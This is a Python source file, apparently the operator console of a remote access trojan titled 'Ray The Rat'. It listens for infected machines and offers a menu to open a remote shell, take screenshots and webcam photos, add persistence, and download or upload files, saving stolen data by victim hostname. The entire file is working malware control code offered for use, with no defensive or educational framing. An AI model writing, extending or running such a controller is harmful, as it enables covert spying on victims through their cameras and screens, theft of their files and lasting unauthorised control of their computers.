import socket
import threading
import os
import struct
from datetime import datetime
import re
import sys
import time



def clear_screen():

    os.system('cls' if os.name == 'nt' else 'clear')

ascii_art = r"""
                                                                                      
                                                                                      
,------.                      ,--------.,--.                ,------.           ,--.   
|  .--. ' ,--,--.,--. ,--.    '--.  .--'|  ,---.  ,---.     |  .--. ' ,--,--.,-'  '-. 
|  '--'.'' ,-.  | \  '  /        |  |   |  .-.  || .-. :    |  '--'.'' ,-.  |'-.  .-' 
|  |\  \ \ '-'  |  \   '         |  |   |  | |  |\   --.    |  |\  \ \ '-'  |  |  |   
`--' '--' `--`--'.-'  /          `--'   `--' `--' `----'    `--' '--' `--`--'  `--'   
                 `---'                         
                 
                                                            written by: @YanivAzran                                                                                              
"""

def print_ascii_effect(text, delay=0.002):
    GREEN = "\033[32m"
    RESET = "\033[0m"
    for line in text.splitlines():
        for char in line:
            sys.stdout.write(f"{GREEN}{char}{RESET}")
            sys.stdout.flush()
            time.sleep(delay)
        sys.stdout.write("\n")
        sys.stdout.flush()
        time.sleep(0.01)

clear_screen()
print_ascii_effect(ascii_art)

LISTEN_IP = '0.0.0.0'
LISTEN_PORT = 2242
BUFFER_SIZE = 4096
SAVE_DIR = 'saved'

RED = "\033[31m"
GREEN = "\033[32m"
ORANGE = "\033[33m"
RESET = "\033[0m"

clients = []
lock = threading.Lock()

def clean_string(s):
    return re.sub(r'[\x00]', '', s).strip()

def recv_data(conn):
    try:
        raw_size = conn.recv(4)
        if not raw_size:
            return None
        data_size = struct.unpack('>I', raw_size)[0]
        data = b""
        while len(data) < data_size:
            part = conn.recv(BUFFER_SIZE)
            if not part:
                break
            data += part
        return data
    except Exception as e:
        print(f"{RED}[!] Error receiving data: {e}{RESET}")
        return None

def send_data(conn, data):
    try:
        data_length = struct.pack('>I', len(data))
        conn.sendall(data_length + data)
    except Exception as e:
        print(f"{RED}[!] Error sending data: {e}{RESET}")

def save_file(hostname, category, filename, data):
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    dir_path = os.path.join(SAVE_DIR, hostname, category)
    os.makedirs(dir_path, exist_ok=True)
    file_path = os.path.join(dir_path, f"{timestamp}_{filename}")
    with open(file_path, 'wb') as f:
        f.write(data)
    return file_path

def handle_client(conn, addr):
    try:
        hostname = clean_string(conn.recv(BUFFER_SIZE).decode())
        with lock:
            clients.append({'conn': conn, 'addr': addr, 'hostname': hostname})
        print(f'\n{GREEN}[+] New connection: {addr[0]}:{addr[1]} ({hostname}){RESET}')
    except Exception as e:
        print(f'\n{RED}[!] Error receiving hostname: {e}{RESET}')
        conn.close()

def accept_connections(server_socket):
    while True:
        conn, addr = server_socket.accept()
        threading.Thread(target=handle_client, args=(conn, addr), daemon=True).start()

def list_clients():
    with lock:
        if not clients:
            print(f'{ORANGE}[!] No connected clients.{RESET}')
            return
        print(f'{GREEN}Connected clients:{RESET}')
        for i, client in enumerate(clients):
            print(f"{i + 1}. {client['addr'][0]} ({client['hostname']})")

def interact_with_client(client):
    conn = client['conn']
    hostname = client['hostname']
    while True:
        print(f"""
{GREEN}1.{RESET} Shell
{GREEN}2.{RESET} Screenshot
{GREEN}3.{RESET} System Info
{GREEN}4.{RESET} Webcam Photo
{GREEN}5.{RESET} Add Persistence
{GREEN}6.{RESET} Download File
{GREEN}7.{RESET} Upload File
{GREEN}8.{RESET} Back to main menu
""")
        choice = input(f"{GREEN}Select option: {RESET}").strip()
        if choice == '1':
            shell_mode(conn)
        elif choice == '2':
            get_screenshot(conn, hostname)
        elif choice == '3':
            system_info(conn)
        elif choice == '4':
            get_webcam_photo(conn, hostname)
        elif choice == '5':
            add_persistence(conn)
        elif choice == '6':
            download_file(conn, hostname)
        elif choice == '7':
            upload_file(conn)
        elif choice == '8':
            break
        else:
            print(f"{RED}[!] Invalid choice.{RESET}")

def shell_mode(conn):
    print(f"{ORANGE}[+] Entering shell mode. Type 'exit' to return.{RESET}")
    while True:
        cmd = input(f'{GREEN}SHELL> {RESET}').strip()
        if cmd.lower() in ('exit', 'quit'):
            break
        if cmd:
            send_data(conn, clean_string(cmd).encode())
            data = recv_data(conn)
            if data:
                print(clean_string(data.decode('utf-8')))

def system_info(conn):
    send_data(conn, "__sysinfo__".encode())
    data = recv_data(conn)
    if data:
        print(f"{GREEN}[System Info]{RESET}\n{clean_string(data.decode('utf-8'))}")

def get_screenshot(conn, hostname):
    send_data(conn, "__screenshot__".encode())
    data = recv_data(conn)
    if data:
        if b'[!]' in data:
            print(clean_string(data.decode('utf-8')))
        else:
            path = save_file(hostname, 'screenshot', 'screenshot.png', data)
            print(f"{GREEN}[+] Screenshot saved to: {path}{RESET}")

def get_webcam_photo(conn, hostname):
    send_data(conn, "__webcam__".encode())
    data = recv_data(conn)
    if data:
        if b'[!]' in data:
            print(clean_string(data.decode('utf-8')))
        else:
            path = save_file(hostname, 'webcam', 'webcam.png', data)
            print(f"{GREEN}[+] Webcam photo saved to: {path}{RESET}")

def add_persistence(conn):
    send_data(conn, "__persist__".encode())
    data = recv_data(conn)
    if data:
        print(f"{GREEN}[Persistence]{RESET}\n{clean_string(data.decode('utf-8'))}")

def download_file(conn, hostname):
    filepath = input(f"{GREEN}Enter remote file path: {RESET}").strip()
    send_data(conn, "__download__".encode())
    send_data(conn, clean_string(filepath).encode())
    data = recv_data(conn)
    if data:
        if b'[!]' in data:
            print(clean_string(data.decode('utf-8')))
        else:
            filename = os.path.basename(filepath)
            path = save_file(hostname, 'downloads', filename, data)
            print(f"{GREEN}[+] File downloaded to: {path}{RESET}")

def upload_file(conn):
    filepath = input(f"{GREEN}Enter local file path to upload: {RESET}").strip()
    if not os.path.isfile(filepath):
        print(f"{RED}[!] File not found.{RESET}")
        return
    filename = os.path.basename(filepath)
    with open(filepath, 'rb') as f:
        data = f.read()
    send_data(conn, "__upload__".encode())
    send_data(conn, clean_string(filename).encode())
    send_data(conn, data)
    response = recv_data(conn)
    if response:
        print(clean_string(response.decode('utf-8')))

def help_menu():
    print(f"""
{GREEN}Available commands:{RESET}
{ORANGE}list{RESET}      - Show all connected clients.
{ORANGE}select <num>{RESET} - Interact with client number <num>.
{ORANGE}help{RESET}      - Show this help menu.
{ORANGE}exit{RESET}      - Close the controller.
""")

def main():
    server_socket = socket.socket()
    server_socket.bind((LISTEN_IP, LISTEN_PORT))
    server_socket.listen(100)
    print(f'{ORANGE}[+] Listening on {LISTEN_IP}:{LISTEN_PORT}{RESET}\n')
    print(f"{GREEN}Type 'help' for available commands.{RESET}")
    threading.Thread(target=accept_connections, args=(server_socket,), daemon=True).start()

    while True:
        cmd = input(f'{GREEN}Controller> {RESET}').strip()
        if cmd == 'list':
            list_clients()
        elif cmd.startswith('select'):
            try:
                index = int(cmd.split()[1]) - 1
                with lock:
                    if 0 <= index < len(clients):
                        interact_with_client(clients[index])
                    else:
                        print(f"{RED}[!] Invalid client number.{RESET}")
            except:
                print(f"{RED}[!] Usage: select <number>{RESET}")
        elif cmd == 'help':
            help_menu()
        elif cmd in ('exit', 'quit'):
            print(f"{ORANGE}[+] Exiting controller.{RESET}")
            break
        else:
            print(f"{RED}[!] Unknown command. Type 'help' for available commands.{RESET}")

if __name__ == '__main__':
    main()
